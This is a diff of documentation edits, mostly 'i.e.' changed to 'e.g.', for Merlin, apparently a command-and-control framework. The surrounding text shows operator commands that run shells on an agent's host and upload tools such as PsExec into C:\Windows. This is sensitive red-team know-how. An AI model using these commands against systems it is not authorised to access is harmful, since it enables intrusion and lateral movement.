 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job npMYqwASOD for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
@@ -546,7 +651,7 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job npMYqwASOD 
 <p>The <code class="docutils literal notranslate"><span class="pre">shell</span></code> command is used to task the agent to run a program on the host and return STDOUT/STDERR. When issuing a command to an agent from
 the server, the agent will execute the provided binary file for the program you specified and also pass along any
 arguments you provide. It is important to note that program must be in the path. This allows an operator to specify and
-use a shell (i.e. cmd.exe, powershell.exe, or /bin/bash) or to execute the program directly <em>WITHOUT</em> a shell.
+use a shell (e.g.,. cmd.exe, powershell.exe, or /bin/bash) or to execute the program directly <em>WITHOUT</em> a shell.
 For instance, <code class="docutils literal notranslate"><span class="pre">ping.exe</span></code> is typically in the host’s %PATH% variable on Windows and works <em>without</em> specifying <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>.
 However, the <code class="docutils literal notranslate"><span class="pre">ver</span></code> command is not an executable in the %PATH% and therefore <em>must</em> be run from <code class="docutils literal notranslate"><span class="pre">cmd.exe</span></code>.</p>
 <p>Example using ping:</p>
@@ -600,7 +705,7 @@ For Linux, an example would be:</p>
 <div class="section" id="quoted-arguments">
 <h3>Quoted Arguments<a class="headerlink" href="#quoted-arguments" title="Permalink to this headline">¶</a></h3>
 <p>When running a command on an agent from the server, the provided arguments are passed to executable that was called.
-As long as there are no special characters (i.e <code class="docutils literal notranslate"><span class="pre">\</span></code> , <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> , <code class="docutils literal notranslate"><span class="pre">;</span></code> , <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> etc.) the command will be processed fine.</p>
+As long as there are no special characters (e.g., <code class="docutils literal notranslate"><span class="pre">\</span></code> , <code class="docutils literal notranslate"><span class="pre">&amp;</span></code> , <code class="docutils literal notranslate"><span class="pre">;</span></code> , <code class="docutils literal notranslate"><span class="pre">|</span></code> , <code class="docutils literal notranslate"><span class="pre">&gt;</span></code> , <code class="docutils literal notranslate"><span class="pre">&lt;</span></code> etc.) the command will be processed fine.</p>
 <p>For example, this command will work fine because it does not have any special characters:</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» cmd powershell.exe Get-Service -Name win* -Exclude WinRM
 </pre></div>
@@ -674,8 +779,8 @@ Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]»
 <div class="section" id="upload">
 <h2>upload<a class="headerlink" href="#upload" title="Permalink to this headline">¶</a></h2>
 <p>The <code class="docutils literal notranslate"><span class="pre">upload</span></code> command is used to upload a file <em>from</em> the Merlin server <em>to</em> the host where the Merlin agent is running. The command is called by proving the location of the file on the Merlin server followed by the location to save the file on the host where the Merlin agent is running.</p>
-<p><strong>NOTE:</strong> Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (i.e <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
-<p><strong>NOTE:</strong> Enclose file paths containing a space with quotation marks (i.e. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
+<p><strong>NOTE:</strong> Because <code class="docutils literal notranslate"><span class="pre">\</span></code> is used to escape a character, file paths require two (e.g., <code class="docutils literal notranslate"><span class="pre">C:\\Windows</span></code>)</p>
+<p><strong>NOTE:</strong> Enclose file paths containing a space with quotation marks (e.g.,. <code class="docutils literal notranslate"><span class="pre">&quot;C:\\Windows\\Program</span> <span class="pre">Files\\&quot;</span></code>)</p>
 <div class="highlight-text notranslate"><div class="highlight"><pre><span></span>Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» upload C:\\SysinternalsSuite\\PsExec.exe C:\\Windows\\PsExec.exe
 Merlin[agent][c1090dbc-f2f7-4d90-a241-86e0c0217786]» [-]Created job vXJsZdZLPP for agent c1090dbc-f2f7-4d90-a241-86e0c0217786
 </pre></div>
